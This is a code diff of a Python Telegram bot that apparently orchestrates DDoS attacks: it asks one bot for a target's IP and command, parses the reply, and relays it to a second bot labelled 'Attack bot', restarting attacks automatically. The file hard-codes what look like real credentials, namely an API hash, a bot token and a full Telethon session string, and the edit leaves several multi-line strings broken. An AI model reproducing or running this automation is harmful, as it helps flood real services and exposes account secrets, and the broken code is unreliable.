@@ -13,27 +13,21 @@ from telegram.ext import (
 # --------------- TELEGRAM CONFIG ---------------
 
 API_ID = 36295148
-API_HASH = """bee66be844e3be0e314508e92a7c4e7d"""
+API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
 
-BOT_TOKEN = """8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"""
+BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"
 
 # Telethon user session (TG test controller account)
-STRING_SESSION = """
-1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37
-rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XN
-O1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2sn
-pHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8v
-QoZm6h2HLUIOwZLZRugWZ-_iRiaYiU=
-"""
+STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="
 
 # Bot usernames (without @)
-BOT_A_USERNAME = """botbysahilbot"""          # IP / CMD provider
-BOT_B_USERNAME = """DDOS_Aditya_xd_bot"""     # Attack bot
+BOT_A_USERNAME = "botbysahilbot"          # IP / CMD provider
+BOT_B_USERNAME = "DDOS_Aditya_xd_bot"     # Attack bot
 
 
 # --------------- GLOBALS ---------------
 
-tele = TelegramClient(StringSession(STRING_SESSION.strip()), API_ID, API_HASH)
+tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
 BOT_A_ID = None
 BOT_B_ID = None
@@ -109,7 +103,7 @@ async def tele_listener(event):
         print("📩 IP BOT REPLY:", text)
 
         # CMD line nikaalna (CMD:, **CMD:**, `CMD:` etc.)
-        m = re.search(r"""CMD[:*s`]*s*(.+)""", text, flags=re.IGNORECASE)
+        m = re.search(r"CMD[:*s`]*s*(.+)", text, flags=re.IGNORECASE)
         if not m:
             return
 
@@ -118,20 +112,17 @@ async def tele_listener(event):
 
         print("✅ FINAL CMD:", cmd)
 
-        # sab chats jaha FSM armed hai
         for cid, state in chat_state.items():
             if not state["armed"]:
                 continue
             if not state["target"]:
                 continue
 
-            # same CMD already running -> ignore
             if cmd == state["current_cmd"]:
                 print(f"[FSM {cid}] Same CMD already running, ignore.")
                 continue
 
             if state["running"]:
-                # naya command aaya, pehle stop queue karo
                 state["pending_cmd"] = cmd
                 print(f"[FSM {cid}] New CMD while running -> queue + /stop.")
                 await cancel_task(cid)
@@ -171,7 +162,7 @@ async def cmd_setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not context.args:
         await update.message.reply_text(
-            """Usage: /setlinkchatid <group_link_or_chatid>"""
+            "Usage: /setlinkchatid <group_link_or_chatid>"
         )
         return
 
@@ -191,8 +182,8 @@ async def cmd_setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
         state["target"] = target
 
     await update.message.reply_text(
-        f"""✅ Target saved for this chat:
-`{target}`""",
+        f"✅ Target saved for this chat:
+`{target}`",
         parse_mode="Markdown",
     )
 
@@ -214,15 +205,19 @@ async def cmd_startfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target = state["target"]
 
     await update.message.reply_text(
-        """✅ Event-driven mode ON.
-• /setlinkchatid se target set karo.
-• BOT_A (.getip) se jo CMD aayega wo auto parse hoga.
-• BOT_B READY hote hi pending attack auto start hoga.
-• Naya CMD aane par purana auto /stop + naya start."""
+        "✅ Event-driven mode ON.
+"
+        "• /setlinkchatid se target set karo.
+"
+        "• BOT_A (.getip) se jo CMD aayega wo auto parse hoga.
+"
+        "• BOT_B READY hote hi pending attack auto start hoga.
+"
+        "• Naya CMD aane par purana auto /stop + naya start."
     )
 
     if target:
-        msg = f""".getip all {target}"""
+        msg = f".getip all {target}"
         print(f"[FSM {cid}] AUTO SEND to BOT_A:", msg)
         try:
             await tele.send_message(BOT_A_ID, msg)
@@ -238,7 +233,7 @@ async def cmd_stopfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_state.pop(cid, None)
 
     await update.message.reply_text(
-        """🛑 Event-driven system stopped for this chat."""
+        "🛑 Event-driven system stopped for this chat."
     )
 
 
